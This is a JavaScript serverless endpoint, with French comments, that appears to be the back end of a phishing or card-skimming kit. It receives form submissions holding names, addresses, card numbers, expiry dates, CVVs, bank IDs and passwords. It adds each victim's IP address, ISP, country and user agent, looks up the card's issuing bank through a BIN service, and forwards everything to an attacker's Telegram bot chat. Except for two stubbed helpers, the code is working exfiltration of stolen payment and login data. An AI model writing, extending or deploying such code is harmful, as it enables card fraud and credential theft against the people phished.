// api/notify.js

const TOKEN        = process.env.TELEGRAM_BOT_TOKEN;
const CHAT         = process.env.TELEGRAM_CHAT_ID;
const IPINFO_TOKEN = process.env.IPINFO_TOKEN || '';

export const config = {
  api: { bodyParser: false },
};

// lit le body (JSON ou texte brut)
async function readBody(req) {
  const ct = req.headers['content-type'] || '';
  const chunks = [];
  for await (const c of req) chunks.push(c);
  const raw = Buffer.concat(chunks).toString();
  if (ct.includes('application/json')) {
    try { return JSON.parse(raw).message || '' }
    catch {}
  }
  return raw;
}

// geoLookup inchangé…
async function geoLookup(ip) {
  /* … code identique à ta dernière version … */
}

// fullCountryName inchangé…
function fullCountryName(codeOrName) { /* … */ }

// lookup BIN
async function getBinInfo(bin8) {
  try {
    const r = await fetch(
      `https://lookup.binlist.net/${bin8}`,
      { headers: { 'Accept-Version': '3' } }
    );
    if (!r.ok) return null;
    const d = await r.json();
    return {
      scheme:  d.scheme       || '?',
      type:    (d.type || '?').replace(/^./, s=>s.toUpperCase()),
      brand:   d.brand        || '?',
      prepaid: d.prepaid ? 'Yes' : 'No',
      country: `${d.country?.emoji||''} ${d.country?.name||'?'}`,
      bank:    d.bank?.name   || '?'
    };
  } catch {
    return null;
  }
}

// URL vers un PNG (Telegram supporte png/jpg, pas svg)
const CARD_LOGOS = {
  visa:         'https://cdn.jsdelivr.net/npm/payment-icons@1.5.0/png/credit/visa/64.png',
  mastercard:   'https://cdn.jsdelivr.net/npm/payment-icons@1.5.0/png/credit/mastercard/64.png',
  'american-express': 'https://cdn.jsdelivr.net/npm/payment-icons@1.5.0/png/credit/amex/64.png',
  // ajoutes-en d’autres si besoin
};

export default async function handler(req, res) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin','*');
  res.setHeader('Access-Control-Allow-Methods','POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers','Content-Type');
  if (req.method==='OPTIONS') return res.status(200).end();

  if (req.method !== 'POST') {
    res.setHeader('Allow','POST, OPTIONS');
    return res.status(405).json({ error:'Method Not Allowed' });
  }

  const rawMsg = (await readBody(req)).trim();
  if (!rawMsg) return res.status(400).json({ error:'Missing message' });

  // IP + UA
  const forwarded = req.headers['x-forwarded-for'];
  const ip        = forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress || 'inconnue';
  const ua        = req.headers['user-agent'] || 'inconnu';

  // geoLookup
  const { isp, countryCode, country } = await geoLookup(ip);
  const countryDisplay = fullCountryName(country||countryCode);

  // date & heure
  const now  = new Date();
  const date = now.toLocaleDateString('fr-FR',{day:'2-digit',month:'2-digit',year:'2-digit'});
  const time = now.toLocaleTimeString('fr-FR',{hour:'2-digit',minute:'2-digit',second:'2-digit'});

  // mapping icônes
  const iconMap = {
    étape:'📣', nom:'👤', prénom:'🙋', téléphone:'📞',
    email:'✉️', adresse:'🏠', carte:'💳', numéro:'🔢',
    exp:'📅', expiration:'📅', cvv:'🔒', banque:'🏦',
    id:'🆔', pass:'🔑', password:'🔑'
  };

  // corps du message
  const lines = rawMsg.split('\n').map(l=>l.trim()).filter(Boolean);
  let text = '';
  for (const line of lines) {
    const low = line.toLowerCase();
    const key = Object.keys(iconMap).find(k=>low.startsWith(k));
    text += (key? iconMap[key]+' ':'') + line + '\n';
  }

  // infos système
  text += `\n🗓️ Date & heure : ${date}, ${time}\n`
       + `🌐 IP Client     : ${ip}\n`
       + `🔎 ISP Client    : ${isp}\n`
       + `🌍 Pays Client   : ${countryDisplay}\n`
       + `📍 User-Agent    : ${ua}\n`
       + `©️ ${now.getFullYear()} ©️`;

  // on cherche la ligne “Numéro:”
  const cardLine = lines.find(l=>/numéro/i.test(l));
  let photoUrl;
  if (cardLine) {
    const digits = cardLine.replace(/\D/g,'');
    if (digits.length>=8) {
      const bin8 = digits.slice(0,8);
      const info = await getBinInfo(bin8);
      if (info) {
        // unique ligne BIN Lookup
        text += `\n💳 BIN Lookup: 🏷️${info.scheme} | 🔖${info.type} | 💳${info.brand} | 💰${info.prepaid} | 🌍${info.country} | 🏦${info.bank}`;

        // récupère une URL PNG depuis notre mapping
        photoUrl = CARD_LOGOS[info.scheme.toLowerCase()];
      }
    }
  }

  // envoi sur Telegram
  let tg;
  if (photoUrl) {
    // envoi de la carte en photo + légende
    tg = await fetch(
      `https://api.telegram.org/bot${TOKEN}/sendPhoto`,
      {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({
          chat_id: CHAT,
          photo: photoUrl,
          caption: text,
          disable_web_page_preview: true
        })
      }
    );
    // si pour une raison l’image ne passe pas, on retombe sur sendMessage
    if (!tg.ok) {
      await tg.text(); // consomme la réponse
      tg = await fetch(
        `https://api.telegram.org/bot${TOKEN}/sendMessage`,
        {
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({ chat_id: CHAT, text, disable_web_page_preview:true })
        }
      );
    }
  } else {
    tg = await fetch(
      `https://api.telegram.org/bot${TOKEN}/sendMessage`,
      {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({ chat_id: CHAT, text, disable_web_page_preview:true })
      }
    );
  }

  const raw = await tg.text();
  return res.status(tg.ok?200:tg.status).json({ ok:tg.ok, full:raw });
}